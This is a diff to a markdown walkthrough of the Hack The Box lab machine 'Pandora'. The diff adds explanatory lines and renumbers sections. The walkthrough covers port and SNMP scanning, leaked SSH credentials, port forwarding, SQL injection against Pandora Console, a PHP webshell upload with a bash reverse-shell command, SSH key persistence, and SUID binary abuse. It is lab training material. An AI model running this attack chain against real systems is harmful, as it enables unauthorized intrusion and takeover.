@@ -1,4 +1,5 @@
-﻿# HTB - Pandora
+
+# HTB - Pandora
 
 **IP Address:** `10.10.11.136`  
 **OS:** Ubuntu (Focal)  
@@ -32,6 +33,9 @@ Privilege escalation is achieved by abusing a misconfigured binary (`pandora_bac
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 ```bash
 ping -c 1 10.10.11.136
 ```
@@ -42,6 +46,9 @@ The host responds, confirming it is alive.
 
 ---
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts
@@ -67,6 +74,9 @@ extractPorts allPorts
 ---
 ### 1.3 Targeted Scan
 
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
 ```bash
 nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
 ```
@@ -84,7 +94,7 @@ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
 | 80   | HTTP    | Apache / Ubuntu     |
 
 ---
-## 2. Web Enumeration
+## 2. Service Enumeration
 
 Check Ubuntu release via **launchpad**:
 
@@ -114,6 +124,9 @@ Contact form confirms valid emails:
 
 ### 2.1 Directory Enumeration
 
+Continue the attack chain with the next commands:
+
+
 ```bash
 gobuster dir -u http://panda.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ```
@@ -130,9 +143,9 @@ Results:
 Blocked here, we pivot to **UDP enumeration**.
 
 ---
-## 3. Service Enumeration
+### 2.2 UDP scan
 
-### 3.1 UDP Scan
+Enumerate UDP for services such as **SNMP** that often expose useful strings:
 
 ```bash
 sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136
@@ -157,9 +170,13 @@ Interesting findings:
 ![udpscan_credentials](screenshots/udpscan_credentials.png)
 
 ---
-## 4. Foothold
+## 3. Foothold
 
 SSH access with leaked credentials:
+
+```bash
+ssh daniel@10.10.11.136
+```
 
 ![ssh_daniel](screenshots/ssh_daniel.png)
 
@@ -167,7 +184,9 @@ We land as **daniel** but user flag belongs to **matt**:
 
 ![user_flag_fail](screenshots/user_flag_fail.png)
 
-### 4.1 Privilege Enumeration
+### 3.1 Privilege Enumeration
+
+Look for unusual **SUID** binaries and other quick wins from the low-privilege shell:
 
 ```bash
 find -perm -4000 2>/dev/null
@@ -192,7 +211,7 @@ curl localhost
 
 ![pandora_console_curl](screenshots/pandora_console_curl.png)
 
-### 4.2 Local Port Forwarding
+### 3.2 Local Port Forwarding
 
 At this stage, we know that **Pandora Console is only accessible internally**, because attempting to browse directly from our machine fails. However, since we already have an SSH session on the target as `daniel`, we can leverage **Local Port Forwarding (LPF)** to tunnel the internal port `80` of the victim machine to our own machine:
 
@@ -210,8 +229,7 @@ Now accessible at `127.0.0.1:80`:
 
 ![pandora_console_web](screenshots/pandora_console_web.png)
 
----
-## 5. Exploitation
+### 3.3 Pandora Console exploitation
 
 Pandora Console v7.0NG.742 detected. Vulnerable to **SQL injection**:  
 [Exploit reference](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)
@@ -228,7 +246,7 @@ Cookie updated, if we refresh the website,  the admin login is successful:
 
 ![pandora_console_login](screenshots/pandora_console_login.png)
 
-### 5.1 File Upload for RCE
+### 3.4 File Upload for RCE
 
 Access File Manager, upload PHP webshell:
 
@@ -267,9 +285,9 @@ http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%2
 ![user_flag](screenshots/user_flag.png)
 
 ---
-## 6. Privilege Escalation
+## 4. Privilege Escalation
 
-### 6.1 SSH Persistence
+### 4.1 SSH Persistence
 
 Generate SSH keys:
 
@@ -282,11 +300,14 @@ ssh-keygen
 
 Connect as matt:
 
+Continue the attack chain with the next commands:
+
+
 ```bash
 ssh -i id_rsa matt@10.10.11.136
 ```
 
-### 6.2 Exploiting `pandora_backup`
+### 4.2 Exploiting `pandora_backup`
 
 Check binary:
 
